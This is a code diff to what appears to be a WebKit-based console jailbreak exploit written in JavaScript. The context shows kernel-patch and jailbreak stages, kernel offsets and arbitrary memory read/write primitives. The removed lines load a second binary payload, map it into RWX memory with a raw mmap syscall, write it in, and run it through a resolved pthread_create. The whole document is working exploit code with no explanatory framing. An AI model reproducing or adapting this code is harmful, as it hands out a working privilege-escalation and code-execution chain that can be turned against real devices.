@@ -155,7 +155,6 @@ let allDone = false,
     const DO_JB = params.get("jb") !== "0";
     const DO_PATCH = params.get("patch") !== "0";
     const DO_PAYLOAD = params.get("payload") !== "0";
-    const DO_DEBUG = params.get("debug") !== "0";
 
     const KEEP_JB = params.get("keepjb") === "1";
 
@@ -190,7 +189,6 @@ let allDone = false,
     const KPATCH_FILE =
       "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
     const PAYLOAD_FILE = off.payload || "payload.bin";
-    const PAYLOAD2_FILE = off.payload2 || null;
     const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
       (k) => off[k] === undefined,
     );
@@ -2552,8 +2550,7 @@ let allDone = false,
               jbRestored = false;
 
             let kpatchBlob = null,
-              payloadBlob = null,
-              payload2Blob = null;
+              payloadBlob = null;
             const SITES = [];
             if (DO_PATCH) {
               try {
@@ -2606,28 +2603,6 @@ let allDone = false,
                     : "none"),
               );
             }
-            if (PAYLOAD2_FILE) {
-              try {
-                const r2 = await fetch(PAYLOAD2_FILE);
-                if (r2.ok) payload2Blob = new Uint8Array(await r2.arrayBuffer());
-              } catch (e) {
-                mark("PAYLOAD2-FETCH-THREW", (e && e.message) || String(e));
-              }
-              mark(
-                "PAYLOAD2-BLOB",
-                "file=" +
-                  PAYLOAD2_FILE +
-                  " bytes=" +
-                  (payload2Blob ? payload2Blob.length : 0) +
-                  " head=" +
-                  (payload2Blob
-                    ? payload2Blob[0] === 0xe9
-                      ? "e9-ok"
-                      : "NOT-e9"
-                    : "none"),
-              );
-            }
-
             if (DO_JB) {
               const P_UCRED = 0x40,
                 P_FD = 0x48,
@@ -3126,79 +3101,6 @@ let allDone = false,
                     "PAYLOAD-RUNNING",
                     plDone,
                     "rc=" + rc + " handle=" + handle,
-                  );
-                }
-              }
-            }
-
-            if (
-              kpDone &&
-              plDone &&
-              payload2Blob &&
-              payload2Blob[0] === 0xe9
-            ) {
-              const sz2 = (payload2Blob.length + 0x3fff) & ~0x3fff;
-              const m2 = sc(SYS.mmap, 0, sz2, 7, 0x1002, -1, 0);
-              const entry2 = new int64(m2.lo, m2.hi);
-              const m2Err = m2.i32 === -1 ? errno() : 0;
-              const entry2Ok = m2.i32 !== -1 && entry2.hi >>> 0 > 0;
-              mark(
-                "PAYLOAD2-MAP",
-                "mmap(anon,rwx,0x" +
-                  sz2.toString(16) +
-                  ")=" +
-                  entry2 +
-                  " err=" +
-                  m2Err,
-              );
-              if (
-                check(
-                  "payload2-rwx-map",
-                  entry2Ok,
-                  "map=" + entry2 + " err=" + m2Err,
-                )
-              ) {
-                for (let o = 0; o < payload2Blob.length; o += 8) {
-                  let lo = 0,
-                    hi = 0;
-                  for (let k = 0; k < 4; k++)
-                    lo |= (payload2Blob[o + k] || 0) << (8 * k);
-                  for (let k = 0; k < 4; k++)
-                    hi |= (payload2Blob[o + 4 + k] || 0) << (8 * k);
-                  p.write8(entry2.add32(o), new int64(lo >>> 0, hi >>> 0));
-                }
-                let bad2 = -1;
-                for (let o = 0; o < payload2Blob.length && bad2 < 0; o++)
-                  if (p.read1(entry2.add32(o)) !== payload2Blob[o]) bad2 = o;
-                mark(
-                  "PAYLOAD2-COPY",
-                  "bytes=" +
-                    payload2Blob.length +
-                    (bad2 < 0 ? " ok" : " MISMATCH@0x" + bad2.toString(16)),
-                );
-                if (bad2 < 0) {
-                  const slot2 = webkitBase.add32(off.wk___imp_pthread_create);
-                  const fn2 = p.read8(slot2);
-                  const expect2 = libkernelBase.add32(off.k_pthread_create);
-                  const thr2 = new ArrayBuffer(8);
-                  keepAlive.push(thr2);
-                  new Uint8Array(thr2).fill(0);
-                  const thr2Addr = bufAddr(thr2);
-                  const rc2 = callAddr(expect2, [thr2Addr, 0, entry2, 0]).i32;
-                  const tdv2 = new DataView(thr2);
-                  const handle2 = new int64(
-                    tdv2.getUint32(0, true),
-                    tdv2.getUint32(4, true),
-                  );
-                  const pl2Done = rc2 === 0 && handle2.hi >>> 0 > 0;
-                  mark(
-                    "PAYLOAD2-RUN",
-                    "pthread_create=" + rc2 + " handle=" + handle2,
-                  );
-                  check(
-                    "PAYLOAD2-RUNNING",
-                    pl2Done,
-                    "rc=" + rc2 + " handle=" + handle2,
                   );
                 }
               }
